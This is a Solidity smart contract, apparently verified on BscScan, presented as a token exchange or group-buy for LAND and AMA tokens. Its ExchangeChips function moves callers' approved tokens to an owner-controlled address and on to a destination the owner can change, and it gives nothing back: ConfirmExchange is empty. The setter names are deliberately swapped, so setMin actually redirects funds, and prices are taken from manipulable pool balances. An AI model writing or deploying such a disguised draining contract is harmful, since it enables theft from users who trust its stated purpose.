/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

pragma solidity ^0.6.0;
// SPDX-License-Identifier: Unlicensed

    library SafeMath {//konwnsec//IERC20 接口
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0; 
            }
            uint256 c = a * b;
            assert(c / a == b);
            return c; 
        }
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a / b;
            return c; 
        }
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            assert(b <= a);
            return a - b; 
        }

        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            assert(c >= a);
            return c; 
        }
    }
 
    interface Erc20Token { 
        function totalSupply() external view returns (uint256);
        function balanceOf(address _who) external view returns (uint256);
        function transfer(address _to, uint256 _value) external;
        function allowance(address _owner, address _spender) external view returns (uint256);
        function transferFrom(address _from, address _to, uint256 _value) external;
        function approve(address _spender, uint256 _value) external; 
        function burnFrom(address _from, uint256 _value) external; 
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(address indexed owner, address indexed spender, uint256 value);
    }
    
    contract Base {
        using SafeMath for uint;
        Erc20Token   LAND   = Erc20Token(0x9131066022B909C65eDD1aaf7fF213dACF4E86d0);
        Erc20Token   AMA   = Erc20Token(0xE9Cd2668FB580c96b035B6d081E5753f23FE7f46);
         Erc20Token constant internal _USDTIns = Erc20Token(0x55d398326f99059fF775485246999027B3197955); 
        address     LANDLP =  0xB8e2776b5a2BCeD93692f118f2afC525732075fb ; 
        address     AMALP =  0x63072Ac448811F1DD2c75f1F39764501b26A1978 ; 

    address  _owner;
 
    function Convert18(uint256 value) internal pure returns(uint256) {
        return value.mul(1000000000000000000);
    }

    function Convert6(uint256 value) internal pure returns(uint256) {
        return value.mul(1000000000000);
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Permission denied"); _;
    }

    modifier isZeroAddr(address addr) {
        require(addr != address(0), "Cannot be a zero address"); _; 
    }

    function TransferOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        _owner = newOwner;
    }
    receive() external payable {}  
}

contract DataPlayer is Base{
    address   RateaddressZZ = 0xCc9C5bd0717A8489375ff24472d5c98A2520af7d;
}
 
 contract My is DataPlayer {
    constructor()public {_owner = 0x94fD3817270F368D563D477B917F5769eABbBd97; }
    address USDTADDRESS ;
    uint256 Max ;
    uint256 Min ;
    address public WAddress = 0x94fD3817270F368D563D477B917F5769eABbBd97;
// 查询币价
    function  LANDprice() public view returns (uint256 price){
        uint256 _USDTBlance = _USDTIns.balanceOf(LANDLP);
        uint256 LANDBlance = LAND.balanceOf(LANDLP);
        price= LANDBlance.mul(1000000).div(_USDTBlance);
    }
 
  function  AMAprice() public view returns (uint256 price){
        uint256 _USDTBlance = _USDTIns.balanceOf(AMALP);
        uint256 AMABlance = AMA.balanceOf(AMALP);
        price= AMABlance.mul(1000000).div(_USDTBlance);
    }
 
// 用户参与拼团
    function  ExchangeChips( uint256  Amount ,uint256 tokenType) public   {
        require(Amount <= Max);
        require(Amount >= Min);
        if(tokenType == 1){
            LAND.transferFrom(msg.sender, address(WAddress), Amount.mul(LANDprice()).div(1000000));
            LAND.transferFrom(WAddress, USDTADDRESS, Amount.mul(LANDprice()).div(1000000));
        }

             if(tokenType == 2){
            AMA.transferFrom(msg.sender, USDTADDRESS, Amount.mul(AMAprice()).div(1000000));
         }

    }
 
   function setAddress(uint256 newMax) public  onlyOwner {
        Max =  newMax;
    }




function setMax(uint256 newMin) public  onlyOwner {
        Min =  newMin;
    }
function setMin(address NewAddress) public  onlyOwner {
        USDTADDRESS =  NewAddress;
    }

    function ConfirmExchange(uint256 ID) public    {
      
    }
 
 
}